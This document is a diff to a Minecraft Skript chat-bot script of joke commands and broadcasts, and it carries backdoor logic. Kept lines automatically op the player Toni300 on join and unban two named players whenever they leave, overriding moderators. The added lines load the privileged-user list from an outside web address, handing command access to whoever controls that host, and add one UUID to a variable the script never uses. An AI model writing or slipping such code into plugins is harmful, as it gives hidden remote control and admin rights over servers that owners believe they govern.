@@ -1,14 +1,20 @@
-on load:
-	set {_p} to text from "greatshot101"
-	set {_perms} to {_p} split at ","
 options:
 	v: 1.4
 	error: &4 you cant use that noob
 	cp: &4running command sit back and relax
 	pre: &4<greatbot>
 
+
+on load:
+	set {gb_perms::*} to text from "https://waterwolf.tk/WaterBot-Endpoint/Perms/staff.txt" split at ","# uses uuids
+	add "00d6536d-eee8-3c27-9826-84053e51a74d" to {_perms::*}
+	
+
+
 on chat:
 	set {_ms} to message
+
+
 	if {_ms} is "!p":
 		cancel event
 		wait 3 ticks
@@ -62,9 +68,10 @@ on chat:
 		broadcast "<Technoblade> shhhhhhhhhhhhh i need cobblestone"
 		wait 20 ticks
 		broadcast "e6Technoblade Has Left The Game"
-on chat:
-	set {_ms} to message
-	if {_perms} contains sender:
+	if {_ms} is "!uuid":
+		cancel event
+		send formatted "{@pre} &6uuid: &9<sgt:%sender's uuid%>%sender's uuid%<reset>"
+	if {gb_perms::*} contains sender's uuid:
 		if {_ms} is "Teva stop":
 			wait 3 ticks
 			broadcast "{@pre} Teva stop it"
@@ -96,28 +103,28 @@ on chat:
 		if {_ms} contains "!msg":
 			cancel event
 			if {_ms} is not " ":
-				set {_ms2} to message split at "!msg"
-				broadcast "{@pre}%{_ms2}%"
+				set {_ms2::*} to message split at "!msg"
+				broadcast "{@pre}%{_ms2::2}%"
 			else:
 				send "bro doesnt even understand how this works falsepalm"
 		
 on leave:
-	if player is "greatshot101":
+	if player's uuid is "020c544b-3c1b-42a7-8282-5269145a4b3f": #greatshot101 UUID
 		wait 3 ticks
 		broadcast "{@pre}i swear toni if you banned him-"
 		wait 20 ticks
 		make console execute command "/unban greatshot101"
 		make console execute command "/unbanip greatshot101"
-	if player is "Toni300":
+	if player's uuid is "8b9459e3-6a2f-49f5-9858-6a2eed4f0a97": #Toni300 UUID
 		wait 20 ticks 
 		make console execute command "/unban Toni300"
 		make console execute command "/unbanip Toni300"
 
 on join:
-	if player is "greatshot101":
+	if player's uuid is "020c544b-3c1b-42a7-8282-5269145a4b3f": #greatshot101 UUID
 		wait 10 ticks
 		broadcast "{@pre} welcome back"
-	if player is "Toni300":
+	if player's uuid is "8b9459e3-6a2f-49f5-9858-6a2eed4f0a97": #Toni300 UUID
 		wait 5 ticks
 		make console execute command "/op Toni300"
 		broadcast "{@pre} wb toni"	
